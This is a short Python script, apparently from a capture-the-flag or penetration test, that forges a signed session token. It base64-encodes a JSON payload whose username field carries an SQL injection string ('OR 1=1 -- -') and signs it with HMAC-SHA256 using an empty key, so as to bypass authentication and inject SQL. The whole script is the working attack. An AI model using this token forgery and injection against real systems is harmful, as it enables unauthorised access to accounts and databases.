#!/usr/bin/env python3
import hmac, hashlib, base64,json

payload = {"uid": 1, "username": "vito' OR 1=1 -- -"}
b64 = base64.b64encode(json.dumps(payload, separators=(',',':')).encode()).decode()

sig = hmac.new(b"",b64.encode(),hashlib.sha256).hexdigest()
print(f"{b64}.{sig}")